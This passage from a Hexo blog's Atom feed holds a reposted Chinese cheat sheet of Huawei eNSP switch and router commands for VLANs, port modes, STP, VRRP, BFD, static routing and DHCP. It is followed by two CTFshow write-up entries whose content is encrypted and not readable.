命令，有以下：<br>（1）用于恢复缺省情况（例如设置设备的名称）<br>&lt; Huawei&gt; system-view<br>[Huawei] sysname Switch<br>[Switch] undo sysname 恢复缺省情况<br>[Huawei]<br>（2）用于禁用某个功能（例如ftp）<br>&lt; Huawei&gt; system-view<br>[Huawei] ftp server enable<br>[Huawei] undo ftp server 禁用设备的ftp功能<br>（3）用于删除某项设置<br>undo后跟某项命令的设置信息即可删除相关的某项配置</p><h4 id="四、关闭泛洪信息"><a href="#四、关闭泛洪信息" class="headerlink" title="四、关闭泛洪信息"></a>四、关闭泛洪信息</h4><p>&lt; Huawei&gt;undo ter mon 关闭终端显示信息中心发送信息</p><h4 id="五、设置设备接口的ip地址和子网掩码"><a href="#五、设置设备接口的ip地址和子网掩码" class="headerlink" title="五、设置设备接口的ip地址和子网掩码"></a>五、设置设备接口的ip地址和子网掩码</h4><p>[Huawei] interface 接口 进入接口视图<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]ip address ip地址 子网掩码 配置ip地址和子网掩码<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]undo shutdown 启动接口<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]display interface 接口 查看接口状态</p><h4 id="六、交换机的登陆"><a href="#六、交换机的登陆" class="headerlink" title="六、交换机的登陆"></a>六、交换机的登陆</h4><p>(一)设置Console接口密码<br>[Huawei]user-interface console 0 进入控制台接口<br>[Huawei-ui-console0]authentication-mode password 设置认证方式为密码认证<br>[Huawei-ui-console0]set authentication password cipher&#x2F;simple 密码<br>配置密文&#x2F;明文密码<br>[Huawei-ui-console0]user privilege level 级别 配置用户级别，级别可为0-15</p><p>(二)设置Telnet接口密码<br>[Huawei]user-interface vty 0 4 进入VTY接口，最多允许5个用户同时登陆<br>[Huawei-ui-vty0-4]authentication-mode aaa 认证方式为aaa模式<br>[Huawei]aaa 进入aaa配置<br>[Huawei-aaa]local-user 用户名 password cipher&#x2F;simple 密码<br>设置用户的密码<br>[Huawei-aaa]local-user 用户名 service-type telnet<br>设置用户的服务类型协议为telnet，也可以为其它协议，比如http即使用Web界面<br>[Huawei-aaa]local-user 用户名 privilege level 级别 配置用户级别</p><h4 id="七、VLAN配置"><a href="#七、VLAN配置" class="headerlink" title="七、VLAN配置"></a>七、VLAN配置</h4><p>(一)单独和批次创建VLAN<br>&lt; Huawei&gt;system-view<br>[Huawei]vlan 10 创建或进入VLAN10<br>[Huawei]vlan batch 10 to 20 创建VLAN10到VLAN20，共创建11个VLAN<br>batch to表示创建连续的VLAN，若省略to则创建或进入指定号码的VLAN</p><p>(二)进入VLAN视图<br>[Huawei]vlan 10 若已创建vlan，则进入该VLAN视图；若没有则创建VLAN10<br>[Huawei-vlan10]name huawei 配置vlan10的名称为huawei<br>[Huawei]vlan vlan-name huawei 通过更改的VLAN名称进入VLAN视图</p><p>(三)将端口指定到VLAN<br>1、单一端口指定VLAN<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type access<br>配置接口类型为access<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port default vlan ID号<br>配置端口的缺省的VLAN并将接口加入到指定vlan</p><p>2、多个端口指定VLAN<br>[Huawei]vlan 10 进入相关VLAN的视图，这里表示进入vlan10<br>[Huawei-vlan10]port GigabitEthernet 0&#x2F;0&#x2F;1 to 0&#x2F;0&#x2F;10 将多个端口一并设置为相关VLAN，这里是将1~10号接口全部设置为VLAN10</p><p>(四)查看配置情况<br>[Huawei]dislay vlan ID号</p><p>[Huawei]display current-configuration 显示当前配置</p><h4 id="八、交换机端口工作模式"><a href="#八、交换机端口工作模式" class="headerlink" title="八、交换机端口工作模式"></a>八、交换机端口工作模式</h4><p>(一)Access模式(接入模式)<br>Access端口只属于单个VLAN，一般用于连接计算机的端口，即只运行设置一个VLAN，丢弃其它VLAN。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入接口视图<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type access 设<br>置端口工作模式为access<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port default vlan ID号 配置端口的缺省的VLAN并将接口加入到指定vlan</p><p>(二)Trunk模式<br>Trunk端口允许多个VLAN通过，可以接收和发送多个VLAN报文，一般用于交换机之间端口，只允许默认VLAN报文发送时不打标签，带有标签的数据被转发至另一个交换机Trunk端口。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type trunk 设置端口工作模式为trunk<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port trunk pvid vlan ID号 指定端口的PVID值<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port trunk allow-pass vlan all&#x2F;ID号<br>允许所有或部分VLAN通过trunk口</p><p>(三)Hybrid模式<br>Hybrid端口和Trunk端口一样，不过它既能用于交换机也能用于计算机，允许多个VLAN报文发送时不打标签。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type hybrid 设置端口工作模式为hybrid<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid pvid vlan ID号 指定端口的PVID值<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid tagged vlan ID号<br>指定相关VLAN的数据发送时添加Tag<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid tagged(untagged) vlan all&#x2F;ID号<br>允许hybrid端口对所有或部分VLAN添加(不添加）Tag</p><h4 id="九、QinQ技术"><a href="#九、QinQ技术" class="headerlink" title="九、QinQ技术"></a>九、QinQ技术</h4><p>QinQ技术用于解决公网VLAN ID的资源紧缺问题，在IEEE 802.1Q协议标签前再次封装IEEE802.1Q协议标签，其中一层标识用户系统网络，另一层标识网络业务。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port link-type dot1q-tunnel 设置交换机端口类型为QinQ端口</p><h4 id="十、VCMP（VLAN集中管理协议）"><a href="#十、VCMP（VLAN集中管理协议）" class="headerlink" title="十、VCMP（VLAN集中管理协议）"></a>十、VCMP（VLAN集中管理协议）</h4><p>VLAN集中管理协议可实现在一台交换机上创建、删除VLAN，提供一种在二层网络中传播VLAN配置信息（域内所有指定的其他交换机自动同步创建、删除相应的VLAN），简单的来说，只需在一台交换机上进行创建、删除VLAN的操作，这些操作会同步至指定的所以交换机，从而大大地减少了工作量，并保证了各修改的一致性。</p><p>1、配置交换机接口的链路类型<br>在VCMP管理域中，通过Trunk或Hybrid链路接口连接的同组域名相同的交换机，所以执行命令port link-type { trunk | hybrid }指定接口的链路类型为Trunk或Hybrid，即在进入相应接口后，输入命令port link-type类型，指定配置接口类型。<br>2、配置VCMP角色</p><p>配置角色为服务器角色，缺省时，VCMP管理域中的角色是client。<br>&lt; Huawei&gt;system-view<br>[Huawei]vcmp role server&#x2F;client&#x2F;silent&#x2F;transparent<br>3、配置管理域的域名和管理域认证密码</p><p>在同一VCMP管理域内的每台交换机的域名必须是相同的；管理域认证密码这一步是可选的，即也可以不配置认证密码，缺省情况下，没有配置认证密码，VCMP报文直接认证通过。要注意若设置了认证密码，则Server与所有Client上的密码是要保持一致的，执行命令vcmp authentication sha2-256 password 认证密码，配置VCMP管理域的认证密码。<br>[Huawei]vcmp 设备ID号 设备名称 配置相应域名<br>[Huawei]vcmp authentication 设备名称 password 密码<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入需要使能VCMP功能的以太网接口视图，在二层以太网接口上使能，比如这里就是进入GigabitEthernet 0&#x2F;0&#x2F;1接口<br>4、使能VCMP功能的接口</p><p>通过interface命令后跟接口名称，进入需要使能VCMP功能的接口视图，使二层以太网处于使能状态，通过执行undo vcmp disable使基于接口使能VCMP功能，缺省情况下，交换机上的所有接口的VCMP功能处于使能状态。<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]undo vcmp disable 基于该接口使能VCMP功能，缺省情况时则交换机上所有接口的VCMP功能处于使能状态</p><h4 id="十一、GVRP-VLAN注册协议"><a href="#十一、GVRP-VLAN注册协议" class="headerlink" title="十一、GVRP(VLAN注册协议)"></a>十一、GVRP(VLAN注册协议)</h4><p>GVRP协议用于注册和注销VLAN属性，手工配置的VLAN称为静态VLAN，而通过GVRP协议创建的VLAN称为动态VLAN。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]vcmp role silent 配置GVRP之前必须要将VCMP角色设置为Silent或Transparent<br>[Huawei]gvrp 全局使能GVRP功能<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入相关接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port link-type trunk 配置接口为trunk类型<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port trunk allow-pass vlan all 允许所有的VLAN通过该接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]gvrp 在接口下执行命令使能接口GVRP功能<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]gvrp registration normal 设置GVRP接口注册模式为normal，简化配置</p><p>[Huawei]display gvrp statistics 在交换机上查看接口的GVRP统计信息</p><h4 id="十二、STP（生成树协议）"><a href="#十二、STP（生成树协议）" class="headerlink" title="十二、STP（生成树协议）"></a>十二、STP（生成树协议）</h4><p>生成树协议是一种链路管理协议，为网络提供路径冗余，同时防止产生环路。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]stp enable 启动生成树协议<br>[Huawei]stp root primary 配置本桥为根桥</p><p>[Huawei]display stp brief 在交换机上查看端口状态和端口的保护类型</p><h4 id="十三、VRRP-虚拟路由冗余协议"><a href="#十三、VRRP-虚拟路由冗余协议" class="headerlink" title="十三、VRRP(虚拟路由冗余协议)"></a>十三、VRRP(虚拟路由冗余协议)</h4><p>虚拟路由冗余协议用于解决局域网中配置静态网关出现单点失效现象的路由协议，可以配置一个交换机群集，通过该协议能实现主设备和备用设备共同分担用户业务的配置。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]interface Ethernet0&#x2F;0&#x2F;1<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]ip addres ip地址 子网掩码</p><p>[Huawei]interface Ethernet0&#x2F;0&#x2F;2<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]ip addres ip地址 子网掩码 配置连接主机的接口IP地址<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 1 virtual-ip ip地址 配置备份组1的虚拟网关地址<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 1 priority 优先级 配置路由器在备份组1中的优先级[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 2 virtual-ip ip地址 配置备份组2的虚拟网关地址</p><p>[Huawei]display vrrp 查看路由器的VRRP状态</p><h4 id="十四、BFD（双向转发检测）"><a href="#十四、BFD（双向转发检测）" class="headerlink" title="十四、BFD（双向转发检测）"></a>十四、BFD（双向转发检测）</h4><p>BFD是一种快速检测、监控网络中链路或IP路由的转发连通状况的全网统一的检测机制。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]bfd 使能全局BFD功能并进入BFD视图<br>*[Huawei]default-ip-address 组播ip地址 配置BFD缺省组播IP地址，缺省情况下，使用组播地址224.0.0.184</p><p>[Huawei]bfd 会话设备名称 bind peer-ip ip地址 interface端口类型 端口号 若有IP地址的三层接口时，创建BFD会话的绑定信息<br>&#x2F;<br>[Huawei]bfd 会话设备名称 bind peer-ip default-ip interface 端口类型 端口号 若为二或无IP的三层接口时，创建组播BFD<br>[Huawei]discriminator local 标识符值 配置BFD会话的本地标识符<br>[Huawei]discriminator remote 标识符值 配置BFD会话的远端标识符<br>[Huawei]commit 提交配置</p><h4 id="十五、显示路由器的路由"><a href="#十五、显示路由器的路由" class="headerlink" title="十五、显示路由器的路由"></a>十五、显示路由器的路由</h4><p>&lt; Huawei&gt;display ip routing-table 显示路由器的路由<br>&lt; Huawei&gt;display ip routing-table verbos 显示路由表的详细信息<br>&lt; Huawei&gt;display ip routing-table acl 编号值 显示通过ACL编号为某值过滤的激活路由的概要信息<br>&lt; Huawei&gt;display ip routing-table 目标网络的网络地址 子网掩码 网关 根据下一跳显示某目的地址的路由</p><h4 id="十六、静态路由、默认路由的配置"><a href="#十六、静态路由、默认路由的配置" class="headerlink" title="十六、静态路由、默认路由的配置"></a>十六、静态路由、默认路由的配置</h4><p>静态路由指定某一网络访问所需要经过的路径，而默认路由是一种特殊的静态路由，当路由表中与包的目的地址之间没有匹配的表项时，路由器做出选择。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]ip routing-static 0.0.0.0 0.0.0.0 默认网关地址 配置默认路由，从而简化配置，提高网络性能</p><p>[Huawei]ip routing-static 目标网络的网络地址 子网掩码 网关 配置静态路由，其中网关处的IP地址说明了路由下一站</p><h4 id="十七、向当前路由表中添加一条新的路由表条目"><a href="#十七、向当前路由表中添加一条新的路由表条目" class="headerlink" title="十七、向当前路由表中添加一条新的路由表条目"></a>十七、向当前路由表中添加一条新的路由表条目</h4><p>[Huawei]route add 210.43.230.33 mask 255.255.255.224 202.103.123.7 metric 5<br>&#x2F;&#x2F;设定一个到目的网络210.43.230.33的路由，中间经过5个路由器网段，首先经过本地网络上的一个路由器IP为202.103.123.7，子网掩码为255.255.255.224</p><h4 id="十八、DHCP（动态主机配置协议）"><a href="#十八、DHCP（动态主机配置协议）" class="headerlink" title="十八、DHCP（动态主机配置协议）"></a>十八、DHCP（动态主机配置协议）</h4><p>动态主机配置协议是基于BOOTP上的改进所来的主机配置协议，通过该协议，DHCP服务器为DHCP客户端进行动态IP地址分配，即不必指明DHCP服务器的IP地址就能获得DHCP服务。</p><p>&lt; Huawei&gt;system-view<br>[Huawei]dhcp option template template1 设置分配的分配的启动配置文件<br>[Huawei-dhcp-option-template-template1]gateway-list 网关地址 配置网关地址<br>[Huawei-dhcp-option-template-template1]bootfile configuration.ini 获取配置文件<br>[Huawei-dhcp-option-template-template1]next-server 配置文件地址 配置获取配置文件地址</p><p>(一)接口模式的DHCP命令<br>[Huawei]dhcp enable 开启DHCP配置功能<br>[Huawei]int g0&#x2F;0&#x2F;1 进入相关接口进行接口模式的DHCP配置<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip address ip地址 子网掩码<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select interface 开启接口的DHCP功能<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server excluded-ip-address 单个要排除的ip地址或两个ip地址即范围<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server lease day 天 hour 时 minute 分 设置地址池ip租用有效期<br>&#x2F;*[Huawei- GigabitEthernet0&#x2F;0&#x2F;1]lease unlimited 租期无限制<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server dns-list 主要DNS 备用DNS 设置DNS<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select interface 开启接口的DHCP功能使其从接口地址池分配地址</p><p>(二)全局模式的DHCP命令<br>[Huawei]dhcp enable<br>[Huawei]ip pool HUAWEI 创建全局地址池，pool后跟名称，这里是HUAWEI<br>[Huawei-ip-pool-HUAWEI]network ip地址 mask 子网掩码 设置全局地址池的范围<br>[Huawei-ip-pool-HUAWEI]getway-list 网关地址 设置分配的网关地址<br>[Huawei-ip-pool-HUAWEI]excluded-ip-address ip地址 ip地址 设置不参与动态分配的地址，可以是一个范围<br>[Huawei-ip-pool-HUAWEI]dhcp server dns-list 主要DNS 备用DNS 设置DNS<br>[Huawei-ip-pool-HUAWEI]lease day 天 hour 时 minute 分 设置地址池ip租用有效期<br>&#x2F;*[Huawei-ip-pool-HUAWEI]lease unlimited 租期无限制<br>[Huawei-ip-pool-HUAWEI]static-bind ip-address ip地址 mac-address MAC地址 option- template template1 对某个MAC地址进行绑定，给该MAC地址分配固定的IP地址<br>[Huawei]int g0&#x2F;0&#x2F;1 进入相关接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select global 指定该接口采用全局地址池为客户端分配ip地址<br>&lt; Huawei&gt;dis ip pool name 全局地址池名称 all 查看全局地址池的分配信息</p><p>原文链接：<a href="https://blog.csdn.net/qq_43085848/article/details/121679021">https://blog.csdn.net/qq_43085848/article/details/121679021</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-参考命令&quot;&gt;&lt;a href=&quot;#网基实践题-参考命令&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-参考命令&quot;&gt;&lt;/a&gt;网基实践题-参考命令&lt;/h1&gt;&lt;h2 id=&quot;ENSP关闭模拟终端提示&quot;&gt;&lt;a href=&quot;#ENSP关闭模拟终</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-misc思路总结</title>
    <link href="https://w-sqrt7.github.io/2024/02/19/CTF/ctfshow-misc%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <id>https://w-sqrt7.github.io/2024/02/19/CTF/ctfshow-misc%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</id>
    <published>2024-02-19T08:35:20.000Z</published>
    <updated>2024-03-01T13:21:37.077Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="37677de5476e94b33219bc7d94f604ff695f9a7642e00f758b56f9195c5a41b0">e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c30229f01987ba5d085c028dc81803e2abcdf3a7dbc2ccc393188cc674bce918557345d9ff92d252757dfc787682350b97c60a4cfa58d9534806784ac29ec51df702695cedc9ae738424414eddb07d61206a7327de8eb82166567b3eed440668a30e9054c983d8c6760d4775ddc12dc5205c1fd15dbc75a996dd0609dbbfc84fcfeb4dddc0387442582f4d39c6bb31eef526117a7f496c1a23895713a8f6b41dfc799fb0c281b29fa90ffa80e8060952a24e4d7e1ae5ffbad0179b04dd58a79061d10e1c818a87f118e2ea0487f664378aa91e699f0b5af794f47e7952b0bbe4e2b8fb2da148b8099c775d854fdc2953cb9144cd0553c20118390ad190961b265c10aa0a0d59283494ae2e94bdc3f0e64025727706aa42e07b2cbabcd8379e83a723708e37f01303cd07f7c502ea1aea576dc821197783c2c9ce41cb8d5a2a76c198b51fcafb3fb6f4456f6e54dfbf0f3382b6c88a64b927ee30583c6ef455d3a5b9d3b81471b8d838e79959fa0f99c2e4b8a55e0aedc5b0a0602e6ae4155d098dccf9fa7b8dc81f0f366511fc6bd10b5beafbe7b87de903334950ea66f84d7e6bb43ace1fa06344f66b2f09feadc5e1796a4904e75f8e2b4a6327e2205f2d67489815464976b5f202f6947f4acfb5df8d368bc9dbf568aa430d7223892eec9b843aed354fcb18619b5ee3f42fa65906c146eb00423c8c56078b10ec379d8ff550f389ad20e0a2e05b3ce534fa25b5842b8bc7dc3437ec9d112cf35b02fff4671a244609dda92a3110867cf389023bb23c35db1549527eeedbff5658a12bb8e1b545232aa1f385ee563d5e7a1bbb9646beb16b2ac04a95147585bbd505e193ded861a0a14beb4fa6a7b664fb3417af33d29ba418c72f482dc622e3500c89742890e943efd592b2cba13de814d71f39a295348c72f4e55b37344bc3f8437a67926bdceaca8d1f65343014d02b02f317984839aa6d21fdbcacc97fe81ab4d9a7dd93c2c4c72d0d438a1ec42301a2d0e3ccba2d222666b0698a016e07624735f96462ff6ac7ec3b97bae754e1505db480cc7b7a887629faa882b367041289b76d85c145416670d825cf0e5144f35f6fe45faadacc29b1794b898bc66319756ae331ee2bd390e79d1e0842f6003948a31ffaaa589122aaf6e68270030ae6a109c389cc7dc001843f25e05ddfec673e3c10906cc0c66fe6163941dad3b9e12ffca2b244b9c0191a0f1913a378dd6eeac13620fd336e7f019316fefdca145604d398d766361a9e33262f0c42ff24e9626b74da33df</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="CTF" scheme="https://w-sqrt7.github.io/categories/CTF/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="misc" scheme="https://w-sqrt7.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-web思路总结</title>
    <link href="https://w-sqrt7.github.io/2024/02/19/CTF/ctfshow-web%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <id>https://w-sqrt7.github.io/2024/02/19/CTF/ctfshow-web%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</id>
    <published>2024-02-19T08:35:20.000Z</published>
    <updated>2024-08-02T09:07:43.148Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="575145b6479f4314cae53a0877d46f4f7a995405bd4adab556f9e3ed3d0e5a62"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="CTF" scheme="https://w-sqrt7.github.io/categories/CTF/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="web" scheme="https://w-sqrt7.github.io/tags/web/"/>
    
  </entry>
  
</feed>
